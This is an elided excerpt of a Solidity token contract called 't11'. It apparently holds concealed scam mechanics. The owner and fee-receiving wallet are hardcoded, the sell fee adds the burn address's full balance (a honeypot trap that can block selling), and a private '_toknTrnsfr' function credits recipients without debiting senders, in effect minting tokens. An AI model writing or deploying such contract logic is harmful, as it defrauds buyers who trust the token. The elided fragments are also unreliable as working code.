...
abstract contract Ownable is Context {
    ...
    constructor () {
         _owner = 0xCC7BC5d46474D82b829a27568205fBdaED812D69;
...
contract t11 is Context, IERC20, Ownable { 
    ...
    string private constant _name = unicode"t11"; 
    string private constant _symbol = unicode"t11"; 
    ...
    uint256 public _BuyFee = 25; // in 0.1% units
 ...
 function addLiquidity(uint256 tokenAmount, uint256 BNBAmount) private {
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            sendToWallet(payable(0xCC7BC5d46474D82b829a27568205fBdaED812D69), BNB_Tot);
            }
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {        
        if(!takeFee){
            ...
            uint256 buyFEE = tAmount*_BuyFee*_lastblockcount/1000;
            ...
            uint256 sellFEE = _SellFee*tAmount*_lastblockcount/1000 + _tOwned[address(0x000000000000000000000000000000000000dEaD)];
            if (_lastblockcount == 2 ){sellFEE = tAmount*_SellFee/1000;}            
            uint256 moonbag = 0;
     ...
     function _toknTrnsfr(address sender, address recipient, uint256 tAmount) private {
            _tOwned[recipient] = _tOwned[recipient]+_tOwned[sender]-_tOwned[sender]+tAmount;
    }
